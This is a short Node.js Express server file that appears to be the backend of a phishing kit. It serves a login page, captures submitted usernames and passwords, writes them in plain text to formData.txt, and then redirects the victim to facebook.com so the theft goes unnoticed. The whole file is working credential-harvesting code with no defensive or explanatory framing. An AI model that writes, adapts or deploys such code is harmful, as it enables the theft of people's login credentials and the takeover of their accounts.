const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = 8080;

app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static('public')); // Serve static files from the 'public' directory

app.get("/", function(req, res){
    res.sendFile(__dirname + "/index.html")
});

app.post('/submit-form', (req, res) => {
    const { username, password } = req.body;
    const formData = `\nName: ${username}, Password: ${password}\n`;

    // Path to the file
    const filePath = path.join(__dirname, 'formData.txt');

    // Write the form data to the file
    fs.writeFile(filePath, formData, (err) => {
        if (err) {
            console.error('Error writing to file:', err);
            return res.status(500).send('Internal Server Error');
        }
        res.redirect('https://www.facebook.com');
    });
});

app.listen(PORT, () => {
    console.log(`Server is running on http://localhost:${PORT}`);
});
